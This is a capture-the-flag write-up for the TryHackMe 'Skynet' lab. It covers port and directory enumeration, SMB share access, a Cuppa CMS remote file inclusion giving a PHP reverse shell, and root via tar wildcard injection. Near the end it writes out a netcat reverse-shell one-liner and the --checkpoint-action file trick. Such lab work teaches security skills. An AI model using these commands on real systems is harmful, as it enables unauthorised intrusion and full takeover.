# Skynet - Writeup

**ID Original:** 60e84cd565e400000104083d
**Slug:** skynet-writeup
--------------------



Follow along with this writeup, and deploy your own instance of Skynet! [https://tryhackme.com/room/skynet](https://tryhackme.com/room/skynet?ref=blog.tryhackme.com)Summary:


* Scan ports using nmap

* Use GoBuster to enumerate directories

* Experiment with SMBMap to find Samba shares

* Using enumerated credentials to read emails

* Exploit CMS RFI vulnerability

* Exploit tar wildcards for privilege escalation

Lets first begin by enumerating the machine as much as possible, by using nmap.nmap -sV &lt;ip&gt;We can see that that there is a web server running, upon visiting we can see the following:"Skynet" is a artificial neural network-based conscious group mind and artificial general intelligence systemLets use GoBuster to locate any directories!gobuster -u http://&lt;ip&gt; -w &lt;wordlist_location&gt; -t 40Sometimes, we're confident that there is something to be found and we waste too much time on it. Often, there are rabbit holes that can trip you up. Make sure to take breaks if you get stuck and try different approaches.Going back to the drawing board, we saw that pop3 and imap ports were open, I wonder what else could be potentially found? Remember what I said above!SMBMap allows users to enumerate samba share drives across an entire domain. This program is available on all Kali Linux machines. If you don't have the time or resources to set your own Kali Linux machine up, you can deploy your own and control it within your browser. [Check it out.](https://tryhackme.com/room/kali?ref=blog.tryhackme.com)The scan reveals a share called "anonymous" that has read access. Lets connect to the share and investigate.smbclient //&lt;ip&gt;/anonymousLog1.txt contains possible passwords and there is a smb share called milesdyson. We have some potential credentials here... But SSH is disabled! What else can we do?An earlier GoBuster scan revealed  SquirrelMail!Gasp! Reading his emails reveals a Samba password reset!Lets log into Miles' share and see what interesting things we can find! You should find a file that gives you information about a new CMS.Visiting the CMS reveals Miles Dysons Personal PageIf you use GoBuster on the /45kra24zxs28v3yd/ directory, you will reveal an /administrator page. This reveals a Cuppa CMS!Looking at the source code will give you an indication of the CMS' version. After some online research, there is a public exploit for it! [https://www.exploit-db.com/exploits/25971](https://www.exploit-db.com/exploits/25971?ref=blog.tryhackme.com)Get a shell script and change the IP to be your tun0 IP (ifconfig), host it locally using Python, use netcat to listen for a session and then remotely include this shell on the webserver.The screenshot below explains the correct steps in obtaining a low privilege shell by exploiting the **RFI **vulnerability! You can download a PHP reverse shell from [PentestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell?ref=blog.tryhackme.com).So whats actually going on here? In the CMS code, there is a bit of PHP code that includes files: &lt;?php include($_REQUEST["urlConfig"]); ?&gt;However, this allows us to include our own shells (or even include a file on the system such as /etc/passwd). For a more detailed explanation, please read the exploit-db description.Now that we have a shell, we can get the user flag. Next step is to escalate our privileges to root!Upon enumerating the Linux machine, we can see there are several regular cronjobs running.So the file /home/milesdyson/backups/backup.sh is being called every minute. Inspecting this file:This gets a shell, navigates to the /var/www/html directory and create a backup of everything in the directory.Well, believe it or not, this creates a vulnerability as we can use it to  execute code. [HelpNetSecurity](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com) best explains how this vulnerability works, but in essence, tar has wildcards and we can use checkpoint actions to execute commands.echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;your ip&gt;
1234 &gt;/tmp/f&quot; &gt; shell.sh
touch &quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;
touch &quot;/var/www/html/--checkpoint=1&quot;
Then open up a netcat session and you will receive a shell as root!